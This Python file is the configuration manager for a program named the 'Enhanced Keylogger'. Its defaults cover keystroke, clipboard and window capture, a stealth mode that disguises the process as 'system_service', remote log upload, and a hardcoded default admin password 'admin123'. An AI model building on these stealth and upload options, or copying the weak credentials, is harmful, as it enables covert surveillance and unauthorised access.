"""Configuration management for the Enhanced Keylogger."""

import os
import json
import logging
from typing import Any, Dict, List, Optional, Union
from pathlib import Path

logger = logging.getLogger(__name__)


class ConfigManager:
    """Manages configuration loading, validation, and access."""
    
    def __init__(self, config_file: str = 'config.json'):
        self.config_file = Path(config_file)
        self.config: Dict[str, Any] = {}
        self.default_config = self._get_default_config()
        
        # Load configuration
        self.load_config()
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration values."""
        return {
            "logging": {
                "level": "INFO",
                "file_path": "logs/keylog.txt",
                "max_size_mb": 100,
                "buffer_size": 100,
                "flush_interval": 5.0,
                "enable_rotation": True,
                "enable_encryption": True,
                "backup_count": 5
            },
            "encryption": {
                "enabled": True,
                "key_file": "keys/encryption.key",
                "algorithm": "AES-256-GCM"
            },
            "features": {
                "keyboard": True,
                "mouse": True,
                "clipboard": True,
                "screenshots": False,
                "usb_monitoring": True,
                "network_monitoring": False,
                "window_tracking": True,
                "performance_monitoring": True
            },
            "privacy": {
                "sanitize_passwords": True,
                "hash_sensitive_data": True,
                "clipboard_max_length": 1000,
                "max_text_length": 1000,
                "sanitization_method": "hash",
                "excluded_applications": [
                    "password_manager.exe",
                    "keepass.exe",
                    "1password.exe",
                    "bitwarden.exe"
                ],
                "sensitive_keywords": [
                    "password", "passwd", "pwd",
                    "ssn", "social security",
                    "credit card", "card number",
                    "cvv", "pin", "secret"
                ],
                "log_mouse_coordinates": False,
                "coordinate_precision": 10
            },
            "performance": {
                "screenshot_interval": 300,
                "window_check_interval": 1.0,
                "clipboard_check_interval": 0.5,
                "max_memory_usage_mb": 500,
                "thread_pool_size": 4,
                "text_flush_interval": 5.0,
                "max_key_sequence": 100,
                "typing_timeout": 2.0,
                "mouse_move_threshold": 50,
                "mouse_move_interval": 1.0,
                "max_click_sequence": 50,
                "double_click_threshold": 0.5,
                "mouse_batch_size": 10,
                "mouse_batch_timeout": 2.0
            },
            "remote": {
                "enabled": False,
                "server_url": "https://your-server.com/api/logs",
                "api_key": "",
                "upload_interval": 3600,
                "compress_uploads": True
            },
            "alerts": {
                "email_enabled": False,
                "email_smtp_server": "smtp.gmail.com",
                "email_smtp_port": 587,
                "email_username": "",
                "email_password": "",
                "email_to": "",
                "alert_on_startup": True,
                "alert_on_errors": True
            },
            "stealth": {
                "hide_console": False,
                "process_name": "system_service",
                "startup_delay": 30,
                "auto_start": False
            },
            "web": {
                "enabled": True,
                "host": "127.0.0.1",
                "port": 5000,
                "debug": False,
                "admin_username": "admin",
                "admin_password": "admin123",
                "secret_key": "your-secret-key-here"
            }
        }
    
    def load_config(self) -> bool:
        """Load configuration from file."""
        try:
            if not self.config_file.exists():
                logger.warning(f"Config file {self.config_file} not found, using defaults")
                self.config = self.default_config.copy()
                self.save_config()
                return True
            
            with open(self.config_file, 'r', encoding='utf-8') as f:
                loaded_config = json.load(f)
            
            # Merge with defaults to ensure all keys exist
            self.config = self._merge_configs(self.default_config, loaded_config)
            
            # Migrate old web credential keys if present
            try:
                web_cfg = self.config.get('web', {}) or {}
                migrated = False
                if 'admin_username' not in web_cfg and 'username' in web_cfg:
                    web_cfg['admin_username'] = web_cfg.get('username')
                    migrated = True
                if 'admin_password' not in web_cfg and 'password' in web_cfg:
                    web_cfg['admin_password'] = web_cfg.get('password')
                    migrated = True
                if migrated:
                    self.config['web'] = web_cfg
                    # Persist migration so future runs are consistent
                    self.save_config()
            except Exception as _:
                # Non-fatal; continue with validation
                pass
            
            # Validate configuration
            validation_errors = self._collect_validation_errors()
            if validation_errors:
                logger.error(f"Configuration validation failed: {validation_errors}")
                return False
            
            logger.info(f"Configuration loaded from {self.config_file}")
            return True
            
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON in config file: {e}")
            self.config = self.default_config.copy()
            return False
        except Exception as e:
            logger.error(f"Error loading config: {e}")
            self.config = self.default_config.copy()
            return False
    
    def save_config(self) -> bool:
        """Save current configuration to file."""
        try:
            # Ensure directory exists
            self.config_file.parent.mkdir(parents=True, exist_ok=True)
            
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Configuration saved to {self.config_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error saving config: {e}")
            return False
    
    def _merge_configs(self, default: Dict[str, Any], loaded: Dict[str, Any]) -> Dict[str, Any]:
        """Recursively merge loaded config with defaults."""
        result = default.copy()
        
        for key, value in loaded.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = self._merge_configs(result[key], value)
            else:
                result[key] = value
        
        return result
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value using dot notation."""
        try:
            keys = key.split('.')
            value = self.config
            
            for k in keys:
                if isinstance(value, dict) and k in value:
                    value = value[k]
                else:
                    return default
            
            return value
            
        except Exception:
            return default
    
    def set(self, key: str, value: Any) -> bool:
        """Set configuration value using dot notation."""
        try:
            keys = key.split('.')
            config = self.config
            
            # Navigate to the parent of the target key
            for k in keys[:-1]:
                if k not in config:
                    config[k] = {}
                config = config[k]
            
            # Set the value
            config[keys[-1]] = value
            return True
            
        except Exception as e:
            logger.error(f"Error setting config value {key}: {e}")
            return False

    def update_config(self, updates: Dict[str, Any]) -> bool:
        """Update multiple configuration values using dot notation keys."""
        try:
            for k, v in updates.items():
                self.set(k, v)
            return True
        except Exception as e:
            logger.error(f"Error updating config: {e}")
            return False
    
    def _collect_validation_errors(self) -> List[str]:
        """Validate configuration and return list of errors."""
        errors: List[str] = []
        
        try:
            # Validate logging section
            if 'logging' in self.config:
                log_config = self.config['logging']
                
                if 'level' in log_config:
                    valid_levels = ['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']
                    if log_config['level'] not in valid_levels:
                        errors.append(f"Invalid logging level: {log_config['level']}")
                
                if 'max_size_mb' in log_config:
                    if not isinstance(log_config['max_size_mb'], (int, float)) or log_config['max_size_mb'] <= 0:
                        errors.append("max_size_mb must be a positive number")
                
                if 'buffer_size' in log_config:
                    if not isinstance(log_config['buffer_size'], int) or log_config['buffer_size'] <= 0:
                        errors.append("buffer_size must be a positive integer")
            
            # Validate encryption section
            if 'encryption' in self.config:
                enc_config = self.config['encryption']
                
                if 'algorithm' in enc_config:
                    valid_algorithms = ['AES-256-GCM', 'AES-256-CBC']
                    if enc_config['algorithm'] not in valid_algorithms:
                        errors.append(f"Invalid encryption algorithm: {enc_config['algorithm']}")
            
            
            # Validate web section
            if 'web' in self.config:
                web_config = self.config['web']
                
                if 'port' in web_config:
                    port = web_config['port']
                    if not isinstance(port, int) or port < 1 or port > 65535:
                        errors.append("Web port must be between 1 and 65535")
            
            # Validate performance section
            if 'performance' in self.config:
                perf_config = self.config['performance']
                
                numeric_fields = [
                    'screenshot_interval', 'window_check_interval', 'clipboard_check_interval',
                    'max_memory_usage_mb', 'thread_pool_size', 'text_flush_interval'
                ]
                
                for field in numeric_fields:
                    if field in perf_config:
                        value = perf_config[field]
                        if not isinstance(value, (int, float)) or value <= 0:
                            errors.append(f"{field} must be a positive number")
            
        except Exception as e:
            errors.append(f"Configuration validation error: {e}")
        
        return errors
    
    def validate_config(self) -> bool:
        """Return True if configuration is valid, otherwise False."""
        return len(self._collect_validation_errors()) == 0
    
    def is_application_excluded(self, app_name: str) -> bool:
        """Check if application is in the exclusion list."""
        try:
            excluded_apps = self.get('privacy.excluded_applications', [])
            app_name_lower = app_name.lower()
            
            for excluded in excluded_apps:
                if excluded.lower() in app_name_lower:
                    return True
            
            return False
            
        except Exception:
            return False

    def is_feature_enabled(self, feature_name: str) -> bool:
        """Check if a named feature is enabled under the 'features' section."""
        try:
            return bool(self.get(f'features.{feature_name}', False))
        except Exception:
            return False
    
    def reload_config(self) -> bool:
        """Reload configuration from file."""
        logger.info("Reloading configuration...")
        return self.load_config()
    
    def get_all_config(self) -> Dict[str, Any]:
        """Get complete configuration dictionary."""
        return self.config.copy()
    
    def reset_to_defaults(self) -> bool:
        """Reset configuration to default values."""
        try:
            self.config = self.default_config.copy()
            return self.save_config()
        except Exception as e:
            logger.error(f"Error resetting config to defaults: {e}")
            return False